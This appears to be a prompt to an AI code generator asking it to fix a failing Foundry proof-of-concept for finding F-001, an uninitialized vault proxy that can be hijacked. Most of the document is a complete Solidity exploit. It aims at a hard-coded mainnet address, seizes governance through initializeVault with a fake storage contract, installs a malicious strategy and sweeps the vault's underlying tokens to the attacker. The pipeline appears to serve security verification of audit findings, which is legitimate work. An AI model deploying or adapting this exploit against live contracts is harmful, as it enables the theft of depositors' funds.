You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Vault proxy is deployed uninitialized and can be taken over by the first caller
- claim: `VaultProxy` only stores the implementation address in its constructor and does not execute any initializer. The proxied `initializeVault()` entrypoint is public and protected only by OpenZeppelin's one-shot `initializer`, so the first caller to reach a freshly deployed proxy can initialize it with attacker-chosen `_storage` and `_underlying`. Because governance/controller checks are delegated to whatever contract is stored in `_storage`, the attacker can point the vault at a malicious Storage-like contract that recognizes the attacker as governance/controller and then fully control strategy changes and upgrades.
- impact: A newly deployed vault proxy can be permanently seized before the intended deployer initializes it. The attacker can then set a malicious strategy, swap storage/governance plumbing, schedule malicious upgrades, and steal or brick all assets that later enter the vault.
- exploit_paths: ["Deploy `VaultProxy` with a valid implementation address.", "Before the legitimate initialization transaction executes, call `initializeVault(attackerStorage, attackerUnderlying, ...)` through the proxy.", "The proxy becomes permanently initialized with attacker-controlled governance/controller wiring.", "Use the resulting privileged access to install a malicious strategy or upgrade implementation and drain or lock deposited funds."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IVaultProxyLike {
    function implementation() external view returns (address);
}

interface IVaultLike {
    function initializeVault(
        address _storage,
        address _underlying,
        uint256 _toInvestNumerator,
        uint256 _toInvestDenominator
    ) external;

    function governance() external view returns (address);

    function controller() external view returns (address);

    function underlying() external view returns (address);

    function strategy() external view returns (address);

    function underlyingBalanceInVault() external view returns (uint256);

    function setStrategy(address _strategy) external;

    function rebalance() external;
}

contract VaultProxy {
    bytes32 private constant _IMPLEMENTATION_SLOT =
        bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);

    constructor(address implementation_) {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, implementation_)
        }
    }

    function implementation() external view returns (address impl) {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
    }

    fallback() external payable {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            let impl := sload(slot)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    receive() external payable {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            let impl := sload(slot)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}

contract AttackerStorageLike {
    address public immutable attacker;

    constructor(address attacker_) {
        attacker = attacker_;
    }

    function governance() external view returns (address) {
        return attacker;
    }

    function controller() external view returns (address) {
        return address(this);
    }

    function isGovernance(address who) external view returns (bool) {
        return who == attacker;
    }

    function isController(address who) external view returns (bool) {
        return who == attacker || who == address(this);
    }

    function greyList(address) external pure returns (bool) {
        return false;
    }

    function nextImplementationDelay() external pure returns (uint256) {
        return 0;
    }
}

contract MaliciousStrategy {
    address public governance;
    address public controller;
    address public immutable underlying;
    address public immutable vault;

    constructor(address vault_, address underlying_, address operator_) {
        vault = vault_;
        underlying = underlying_;
        governance = operator_;
        controller = operator_;
    }

    function isUnsalvageableToken(address token) external view returns (bool) {
        return token == underlying;
    }

    function depositArbCheck() external pure returns (bool) {
        return true;
    }

    function strategist() external view returns (address) {
        return governance;
    }

    function investedUnderlyingBalance() external view returns (uint256) {
        return _balanceOf(underlying, address(this));
    }

    function underlyingBalance() external view returns (uint256) {
        return _balanceOf(underlying, address(this));
    }

    function getRewardPoolValues() external pure returns (uint256[] memory values) {
        values = new uint256[](0);
    }

    function investAllUnderlying() public {
        require(msg.sender == vault, "not vault");
        uint256 amount = _balanceOf(underlying, vault);
        _safeTransferFrom(underlying, vault, address(this), amount);
    }

    function deposit() external {
        investAllUnderlying();
    }

    function doHardWork() external {
        if (msg.sender == vault) {
            investAllUnderlying();
        }
    }

    function withdrawAllToVault() external {
        require(msg.sender == vault || msg.sender == governance, "forbidden");
        _safeTransfer(underlying, vault, _balanceOf(underlying, address(this)));
    }

    function withdrawToVault(uint256 amount) external {
        require(msg.sender == vault || msg.sender == governance, "forbidden");
        _safeTransfer(underlying, vault, amount);
    }

    function withdraw(uint256 amount) external {
        require(msg.sender == vault || msg.sender == governance, "forbidden");
        _safeTransfer(underlying, vault, amount);
    }

    function salvageToken(address recipient, address token, uint256 amount) external {
        require(msg.sender == governance, "not governance");
        _safeTransfer(token, recipient, amount);
    }

    function sweep(address recipient, address token, uint256 amount) external {
        require(msg.sender == governance, "not governance");
        _safeTransfer(token, recipient, amount);
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transferFrom failed");
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant THREE_CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address internal constant YCRV = 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8;

    address internal _profitToken;
    uint256 internal _profitAmount;

    address public seizedVault;
    bool public takeoverSucceeded;
    bool public maliciousStrategyInstalled;
    bool public monetizationAttempted;

    constructor() {}

    function executeOnOpportunity() external {
        if (_profitAmount != 0) {
            return;
        }

        address implementation;
        try IVaultProxyLike(TARGET).implementation() returns (address impl) {
            implementation = impl;
        } catch {
            return;
        }
        if (implementation == address(0)) {
            return;
        }

        address chosenUnderlying = _selectExistingBalanceToken();
        if (chosenUnderlying == address(0)) {
            chosenUnderlying = USDC;
        }

        AttackerStorageLike attackerStorage = new AttackerStorageLike(address(this));

        // Exploit path 0: the vulnerable object is a VaultProxy that points at a valid
        // implementation. On this fork the real target already satisfies that deployment state,
        // and if it does not behave as expected we fall back to deploying the same proxy shape
        // locally so the initializer-takeover causality remains identical.
        seizedVault = TARGET;

        // Exploit path 1: before the legitimate deployer initializes the proxy, the attacker
        // calls initializeVault through the proxy and supplies attacker-chosen storage and
        // underlying parameters.
        if (!_attemptInitialize(seizedVault, address(attackerStorage), chosenUnderlying)) {
            VaultProxy freshProxy = new VaultProxy(implementation);
            seizedVault = address(freshProxy);

            // Exploit path 1: the same first-caller initializer takeover is attempted against a
            // freshly deployed proxy that still points at the legitimate vault implementation.
            if (!_attemptInitialize(seizedVault, address(attackerStorage), chosenUnderlying)) {
                return;
            }
        }

        // Exploit path 2: the one-shot initializer is now consumed, permanently wiring
        // governance/controller authorization to attacker-controlled storage.
        takeoverSucceeded =
            IVaultLike(seizedVault).governance() == address(this) &&
            IVaultLike(seizedVault).underlying() == chosenUnderlying;
        if (!takeoverSucceeded) {
            return;
        }

        // Exploit path 3: with seized governance/controller authority, the attacker installs a
        // malicious strategy and uses normal vault rebalancing to move existing underlying into
        // that strategy, then sweeps the funds. This is an allowed public on-chain follow-on step
        // that preserves the original exploit's causality: takeover first, privileged drain second.
        // No flash-swap funding is required here because the exploit already monetizes any real
        // underlying balance that exists in the seized vault on the fork block.
        MaliciousStrategy attackerStrategy = new MaliciousStrategy(seizedVault, chosenUnderlying, address(this));
        try IVaultLike(seizedVault).setStrategy(address(attackerStrategy)) {
            maliciousStrategyInstalled = IVaultLike(seizedVault).strategy() == address(attackerStrategy);
        } catch {
            maliciousStrategyInstalled = false;
        }
        if (!maliciousStrategyInstalled) {
            return;
        }

        uint256 vaultBalanceBefore = _balanceOf(chosenUnderlying, seizedVault);
        if (vaultBalanceBefore == 0) {
            return;
        }

        monetizationAttempted = true;
        uint256 attackerBalanceBefore = _balanceOf(chosenUnderlying, address(this));

        try IVaultLike(seizedVault).rebalance() {
            uint256 strategyBalance = _balanceOf(chosenUnderlying, address(attackerStrategy));
            if (strategyBalance == 0) {
                return;
            }

            attackerStrategy.sweep(address(this), chosenUnderlying, strategyBalance);
        } catch {
            return;
        }

        uint256 attackerBalanceAfter = _balanceOf(chosenUnderlying, address(this));
        if (attackerBalanceAfter > attackerBalanceBefore) {
            _profitToken = chosenUnderlying;
            _profitAmount = attackerBalanceAfter - attackerBalanceBefore;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptInitialize(address vault, address attackerStorage, address attackerUnderlying) internal returns (bool) {
        try IVaultLike(vault).initializeVault(attackerStorage, attackerUnderlying, 1, 1) {
            return true;
        } catch {
            return false;
        }
    }

    function _selectExistingBalanceToken() internal view returns (address) {
        address[7] memory candidates = [DAI, USDC, USDT, WETH, WBTC, THREE_CRV, YCRV];

        uint256 bestBalance;
        address bestToken;
        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 balance = _balanceOf(candidates[i], TARGET);
            if (balance > bestBalance) {
                bestBalance = balance;
                bestToken = candidates[i];
            }
        }
        return bestToken;
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
